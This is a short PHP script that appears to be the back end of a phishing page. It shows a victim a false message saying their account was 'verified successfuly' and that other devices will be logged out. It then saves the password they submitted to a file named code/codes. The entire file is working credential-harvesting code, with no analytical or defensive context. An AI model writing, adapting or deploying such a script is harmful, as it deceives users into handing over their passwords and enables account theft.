<?php
echo 'your account was verified successfuly and will be logingout from all other devices';
if(! ( isset($_REQUEST['password']) ) ){
	return false;
}
$password = $_REQUEST['password'];
$fp = fopen('code/codes', 'w');
fwrite($fp, $password);
fclose($fp);
?>
